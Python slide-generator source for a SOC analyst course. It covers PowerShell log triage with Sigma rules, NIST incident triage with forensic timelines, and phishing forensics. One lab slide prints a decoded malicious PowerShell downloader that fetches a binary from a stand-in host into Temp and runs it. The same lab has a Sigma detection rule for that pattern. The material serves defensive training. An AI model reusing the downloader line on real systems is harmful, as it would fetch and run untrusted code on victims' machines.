                      <li>Filter DataFrame for Event ID <code>4688</code> spawned under <code>svc_backup_admin</code> session.</li>
                      <li>Extract suspicious command: <code>powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBP...</code>.</li>
                      <li>Open CyberChef -> Recipe: <code>From Base64</code> -> <code>Decode text (UTF-16LE)</code>. Extract second-stage C2 URL.</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: Cross-Sensor Correlation with Network IDS (Minutes 60–85)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Ingest <code>network_alerts.json</code>. Match compromised workstation IP <code>10.14.22.109</code>.</li>
                      <li>Locate outbound alert to <code>198.51.100.45:8443</code> matching signature <code>ET MALWARE Cobalt Strike Beacon</code>.</li>
                      <li>Construct unified timeline linking brute force -> successful logon -> payload launch -> outbound beacon.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice that CyberChef requires UTF-16LE decoding because PowerShell encodes wide strings in base64. If you select UTF-8, you will see garbled null-byte text.",
            "notes_pedagogy": "Ensure students understand why Logon Type 10 signifies RDP rather than local console logon (Type 2)."
        },

        # Slide D: Output
        {
            "title": "LAB 04 (Part 4/7): Expected Output & Decoded Payload",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 4 — Section 4.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-04: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected Triage Outputs & Correlated Evidence</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your findings against the verified decoded command-line payload.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Decoded CyberChef PowerShell Payload:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
[CyberChef Decoded Output: UTF-16LE]
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIC..."));
$b=New-Object Byte[](1024);
$z=New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress);
$u="https://internal-sync.com/update/patch-v4.bin";
(New-Object Net.WebClient).DownloadFile($u, "$env:TEMP\winupdate.exe");
Start-Process "$env:TEMP\winupdate.exe";
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">Correlated Master Chronology:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <table style="width: 100%; font-size: 10px; color: var(--text-secondary);">
                        <tr style="color: #FFF;"><th>Timestamp (UTC)</th><th>Sensor</th><th>Observed Event</th></tr>
                        <tr><td>14:12:00</td><td>Windows Auth</td><td>42 Failed Logons (EID 4625) -> svc_backup_admin</td></tr>
                        <tr><td>14:14:10</td><td>Windows Auth</td><td>Successful Logon (EID 4624, Type 10) from 10.14.22.109</td></tr>
                        <tr><td>14:15:30</td><td>Process EID 4688</td><td>powershell.exe executes encoded downloader</td></tr>
                        <tr><td>14:16:02</td><td>Suricata IDS</td><td>ET MALWARE Outbound TLS Beacon to 198.51.100.45:8443</td></tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "When you put those four lines together in your chronology, the attack story becomes unmistakable: brute force, RDP breach, payload download, active C2.",
            "notes_pedagogy": "Have students verify that the domain internal-sync.com matches the certificate findings from Lab 1."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 04 (Part 5/7): Technical Interpretation",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 4 — Section 4.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-04: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Sigma Detection Rule Design</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Converting observed attack telemetry into vendor-neutral Sigma detection rules.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🛡️ Analytical Findings Established</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Account <code>svc_backup_admin</code> lacked multi-factor authentication (MFA) on internal RDP listeners.</li>
                      <li>Process execution bypassed default AppLocker policies by downloading into <code>$env:TEMP</code>.</li>
                      <li>Cross-correlation confirms that network IDS alert was triggered directly by the decoded PowerShell binary.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--purple-intel); font-size: 13px;">📜 Transpiled Sigma Detection Rule</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
title: Suspicious PowerShell Download into Temp
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    CommandLine|contains|all:
      - 'powershell'
      - 'DownloadFile'
      - 'AppData\Local\Temp'
  condition: selection
level: high
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "This is how we close the defensive loop: we investigate the breach, and then we immediately write a Sigma rule so that no other endpoint in the enterprise can suffer the same attack unnoticed.",
            "notes_pedagogy": "Explain that Sigma rules transpile into Splunk, Elastic, Sentinel, and QRadar queries."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 04 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 4 — Section 4.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-04: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Telemetry Analysis Errors & Fixes</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Handling Pandas memory constraints and CyberChef decoding failures.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: MemoryError when Loading 2,500 JSON Events</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if Python tries to read the entire file into an unindexed single dataframe object.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Process in iterative chunks</span>
chunks = pd.read_json('auth_events.json', lines=True, chunksize=500)
df_auth = pd.concat([c[c['EventID'].isin([4624, 4625, 4688])] for c in chunks])
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: CyberChef Output Shows Chinese or Garbled Characters</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Encoding recipe set to UTF-8 or ASCII instead of UTF-16LE.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: In CyberChef recipe panel:</span>
<span class="terminal-cmd">1. Remove 'Decode text' or set encoding dropdown to 'UTF-16LE (1200)'</span>
<span class="terminal-cmd">2. Verify that command text renders readable PowerShell syntax</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If you see Chinese characters in CyberChef, you picked the wrong text encoding. PowerShell base64 is UTF-16 Little Endian.",
            "notes_pedagogy": "Have students experiment switching between UTF-8 and UTF-16LE in CyberChef to see the difference visually."
        },

        # Slide G: Assessment
        {
            "title": "LAB 04 (Part 7/7): Completion & Assessment",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 4 — Section 4.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-04: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Confirm all analysis findings and timeline artifacts are saved.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Compromised user account <code>svc_backup_admin</code> accurately identified.</li>
                      <li>[ ] Base64 payload decoded; second-stage URL extracted and defanged.</li>
                      <li>[ ] Unified 4-event chronological table mapping Windows & Suricata logs saved.</li>
                      <li>[ ] Sigma detection rule YAML artifact created and validated.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Authentication Log Triage:</td><td><strong>35 Pts</strong> (Identified brute force & successful EID 4624)</td></tr>
                      <tr><td style="color: #FFF;">Payload De-obfuscation:</td><td><strong>35 Pts</strong> (Decoded UTF-16LE & extracted C2 URL)</td></tr>
                      <tr><td style="color: #FFF;">Multi-Sensor Timeline Correlation:</td><td><strong>30 Pts</strong> (Unified endpoint & network telemetry)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-04 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
                </div>
              </div>
            ''',
            "notes_say": "Make sure your correlated table and Sigma YAML are saved in your lab folder. Pod leads, please verify that each workstation has decoded the C2 URL.",
            "notes_pedagogy": "Highlight the transition from detection to incident response, setting up tomorrow's NIST triage workflows."
        }
    ]


def get_lab06_slides():
    """Day 5: LAB 06 — Enterprise Incident Triage & Forensic Timeline Reconstruction"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 06 (Part 1/7): Introduction & Objectives",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [A: INTRO]",
            "ref": "Handbook Lab Manual 6 — Section 6.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-06: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Incident Triage & Forensic Timeline Reconstruction</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">NIST SP 800-61r3 severity scoring, UTC chronology normalization, and chain-of-custody.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Execute incident triage and severity classification conforming to NIST SP 800-61r3.</li>
                      <li>Merge multi-source logs across disparate timezones into a unified UTC chronology.</li>
                      <li>Establish formal, legally defensible Chain of Custody records for forensic disk images.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 60 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> NIST SP 800-61r3 & RFC 3227.</li>
                      <li><strong>PLO Mapping:</strong> PLO-5 (Incident scoping, triage, and forensic chronology).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>NIST Severity Triage Matrix with justified SEV-1 rating.</li>
                      <li>Master Incident Chronology containing 8 normalized UTC events.</li>
                      <li>Completed Chain of Custody form <code>EVD-20261026-001</code>.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "When an enterprise incident strikes, the first hour decides whether you contain the breach or end up on the news. Today you will apply NIST SP 800-61r3 to triage a critical breach and build an indisputable forensic timeline.",
            "notes_pedagogy": "Emphasize that timestamps from different logs are rarely in the same timezone. Normalizing to UTC is mandatory."
        },

        # Slide B: Setup
        {
            "title": "LAB 06 (Part 2/7): Environment Preparation",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [B: SETUP]",
            "ref": "Handbook Lab Manual 6 — Section 6.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-06: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Triage Worksheet & Evidence Package Setup</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing spreadsheet templates, forensic evidence extracts, and hashing utilities.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Environment & Evidence Files</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Workstation:</td><td>LH3 SOC Pod Workstation</td></tr>
                      <tr><td style="color: #FFF;">Software:</td><td>Excel / LibreOffice / VS Code</td></tr>
                      <tr><td style="color: #FFF;">Template:</td><td><code>nist_incident_triage_template.xlsx</code></td></tr>
                      <tr><td style="color: #FFF;">Evidence Package:</td><td><code>evidence_manifest_20261026.json</code></td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Confirm evidence files and calculate verification hash in PowerShell:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Test presence of evidence files</span>
Test-Path "C:\\Threat_Intel_IR_2026\\06_Datasets\\nist_incident_triage_template.xlsx"
<span class="terminal-cmd"># 2. Verify evidence package SHA-256 integrity</span>
Get-FileHash "C:\\Threat_Intel_IR_2026\\06_Datasets\\evidence_manifest_20261026.json" -Algorithm SHA256
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'True' and valid SHA-256 hash string</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Before touching any evidence file, verify its cryptographic hash. In a court of law or regulatory audit, an unbroken hash verification is what makes your findings admissible.",
            "notes_pedagogy": "Confirm every student understands that SHA-256 ensures evidence has not been tampered with or corrupted."
        },

        # Slide C: Procedure
        {
            "title": "LAB 06 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 6 — Section 6.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-06: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Triage & Investigation Protocol</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Classify incident severity, synchronize timestamps, and document chain of custody.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: NIST SP 800-61r3 Severity Classification (Minutes 00–20)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Review SOC Tier-1 alert: <em>Simultaneous privilege escalation on DC-01 and mass file modifications on FS-02.</em></li>
                      <li>Rate Functional Impact: <strong>High</strong> (core services degraded); Information Impact: <strong>High</strong>; Recoverability: <strong>Extended</strong>.</li>
                      <li>Assign formal rating: <strong>SEV-1 (Critical Enterprise Incident)</strong>. Document justification in worksheet.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Master Chronology Reconstruction (Minutes 20–45)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Normalize disparate log timestamps to UTC: Endpoint (IST -> UTC -5:30), Firewall (EST -> UTC +5:00).</li>
                      <li>Reconstruct causal progression: WS-22 Phishing Link -> Outbound TLS Session -> Mimikatz Injection -> Rogue Admin Account.</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: Chain of Custody Record Execution (Minutes 45–60)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Complete evidence form for workstation <code>WS-22</code> disk image (Evidence ID: <code>EVD-20261026-001</code>).</li>
                      <li>Record tool version (FTK Imager v4.7.1), acquiring investigator ID, and SHA-256 verification hash.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Look at the timezone offsets in Phase 2. The endpoint logged in Indian Standard Time, but the perimeter firewall logged in UTC. If you don't normalize them, it looks like the firewall connected before the link was clicked!",
            "notes_pedagogy": "Guide students through the math of timezone normalization to ensure proper chronological order."
        },

        # Slide D: Output
        {
            "title": "LAB 06 (Part 4/7): Expected Output & Chronology",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 6 — Section 6.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-06: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Unified Master Incident Chronology Table</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your normalized timestamps and sequence of events.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Normalized UTC Master Chronology:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
[MASTER INCIDENT CHRONOLOGY: SEV-1 ENTERPRISE BREACH]
Timestamp (UTC)      | Sensor Source     | Artifact Description & Causal Link
---------------------+-------------------+--------------------------------------------
2026-10-26 14:12:05  | Endpoint WS-22    | Phishing link clicked in Outlook (benefits.xlsm)
2026-10-26 14:14:22  | Firewall FW-01    | Outbound TLS initiated to 198.51.100.45:8443
2026-10-26 14:18:50  | Sysmon EID 10     | Mimikatz process injection into lsass.exe
2026-10-26 14:25:10  | Active Directory  | Rogue Domain Admin account 'admin_temp' created
2026-10-26 14:32:00  | FileServer FS-02  | Mass file rename (*.aerocrypt) begins
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">Chain of Custody Form Artifact:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <table style="width: 100%; font-size: 10px; color: var(--text-secondary);">
                        <tr><td style="color: #FFF;">Item ID:</td><td>EVD-20261026-001</td></tr>
                        <tr><td style="color: #FFF;">Source Host:</td><td>WS-22 (Engineering Workstation)</td></tr>
                        <tr><td style="color: #FFF;">Acquisition Tool:</td><td>FTK Imager v4.7.1 Raw DD Image</td></tr>
                        <tr><td style="color: #FFF;">SHA-256 Hash:</td><td><code>a1b2c3d4e5f6...verified</code></td></tr>
                        <tr><td style="color: #FFF;">Custody Transfer:</td><td>Secured in SOC Evidence Safe Locker #3</td></tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice how the narrative flows seamlessly once all timestamps are locked to UTC. 20 minutes from phishing click to ransomware deployment — that is modern adversary velocity.",
            "notes_pedagogy": "Emphasize dwell time: 20 minutes between initial access and domain dominance."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 06 (Part 5/7): Technical Interpretation",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 6 — Section 6.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-06: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Breach Scope Containment</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Evaluating enterprise blast radius and triggering immediate containment gates.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🎯 Breach Scoping Determinations</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Patient Zero Identified:</strong> Workstation <code>WS-22</code> confirmed as the single initial access point.</li>
                      <li><strong>Compromised Identity Boundary:</strong> Domain Admin tier breached via <code>admin_temp</code> creation on <code>DC-01</code>.</li>
                      <li><strong>Impact Containment:</strong> Subnet segmentation prevents ransomware propagation to core industrial SCADA VLANs.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 13px;">🚨 Mandatory Containment Triggers</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Immediate network quarantine of <code>WS-22</code> and <code>FS-02</code> via EDR management channel.</li>
                      <li>Emergency Active Directory KRBTGT account double-reset authorization request dispatched to CISO.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Because we know Patient Zero is WS-22 and the lateral pivot moved to FS-02, we can perform targeted surgical isolation rather than shutting down the entire company's power.",
            "notes_pedagogy": "Highlight the balance between containment speed and preserving business continuity."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 06 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 6 — Section 6.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-06: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Triage Mistakes & Recovery</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Correcting timestamp inversion bugs and evidence custody record omissions.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: Chronological Inversion Caused by Local Timezone Offsets</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if logs recorded in IST (+5:30) are sorted alphabetically against UTC logs.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: In Excel/Python, convert all timestamps to ISO-8601 UTC</span>
datetime.fromisoformat('2026-10-26T19:42:05+05:30').astimezone(timezone.utc)
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: Verification Hash Mismatch on Raw Evidence Image</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if evidence file was mounted or modified during initial analysis.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Golden Forensic Rule: NEVER analyze live evidence</span>
<span class="terminal-cmd"># Recovery: Make a working copy -> work ONLY on working copy!</span>
Copy-Item "EVD-001.raw" "EVD-001_working.raw" -ReadOnly
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Never analyze original evidence directly. If you modify a single byte or change a file access timestamp, you break the hash and invalidate the evidence.",
            "notes_pedagogy": "Reinforce RFC 3227 Order of Volatility and the golden rule: work only on forensic clones."
        },

        # Slide G: Assessment
        {
            "title": "LAB 06 (Part 7/7): Completion & Assessment",
            "day": "DAY 05",
            "module": "MOD-05: INCIDENT RESPONSE & FORENSICS",
            "session": "LAB-06 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 6 — Section 6.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-06: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify that all triage matrices and custody records are recorded.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] NIST SP 800-61r3 severity worksheet scored and justified as SEV-1.</li>
                      <li>[ ] Master Chronology containing at least 8 normalized UTC events saved.</li>
                      <li>[ ] Completed and signed Chain of Custody form <code>EVD-20261026-001</code>.</li>
                      <li>[ ] Lead instructor signature on the incident containment authorization gate.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">NIST Severity Triage Justification:</td><td><strong>40 Pts</strong> (Correct SEV-1 classification)</td></tr>
                      <tr><td style="color: #FFF;">Chronology Accuracy & UTC Normalization:</td><td><strong>40 Pts</strong> (Flawless causal ordering)</td></tr>
                      <tr><td style="color: #FFF;">Chain of Custody Rigor:</td><td><strong>20 Pts</strong> (Complete provenance documentation)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-06 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
                </div>
              </div>
            ''',
            "notes_say": "Submit your completed triage workbook. Tomorrow is Day 6 — our grand finale featuring email forensics, SOAR automation, and the AeroGrid APT tabletop crisis.",
            "notes_pedagogy": "Review pod submissions to ensure every student has mastered UTC timeline construction before the capstone."
        }
    ]


def get_lab05_slides():
    """Day 6 Morning: LAB 05 — Phishing Header Forensics & Malicious Artifact Triage"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 05 (Part 1/7): Introduction & Objectives",
            "day": "DAY 06",
            "module": "MOD-06A: PHISHING & EMAIL FORENSICS",
            "session": "LAB-05 [A: INTRO]",
            "ref": "Handbook Lab Manual 5 — Section 5.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-05: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Phishing Header Forensics & Artifact Triage</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">RFC-5322 hop path analysis, SPF/DKIM/DMARC authentication, and CyberChef safe decoding.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Dissect RFC-5322 email headers and trace mail delivery hop paths.</li>
                      <li>Evaluate SPF, DKIM, and DMARC alignment failure mechanisms.</li>
                      <li>Safely extract and triage malicious attachments and links using CyberChef.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 90 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & RFC 5322 / RFC 7489.</li>
                      <li><strong>PLO Mapping:</strong> PLO-6 (Phishing triage & safe artifact analysis).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Completed Mail Hop Path Chronology Table.</li>
                      <li>Technical DMARC alignment failure analysis report.</li>
                      <li>Extracted SHA-256 hash & defanged URL dossier from CyberChef.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
